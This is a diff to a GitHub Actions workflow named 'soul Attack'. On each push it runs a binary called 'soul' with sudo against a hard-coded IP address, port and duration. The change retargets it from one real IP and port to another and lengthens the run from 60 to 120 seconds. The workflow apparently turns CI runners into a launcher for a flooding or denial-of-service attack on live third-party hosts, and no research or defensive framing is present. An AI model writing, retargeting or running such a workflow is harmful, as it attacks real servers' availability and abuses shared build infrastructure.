@@ -1,5 +1,5 @@
 name: soul Attack
-On: [push]
+on: [push]
 
 jobs:
   soul:
@@ -11,5 +11,5 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - run: chmod +x soul
-    - run: sudo ./soul 20.204.148.51 14444 60
+    - run: sudo ./soul 91.108.17.2 32001 120
     
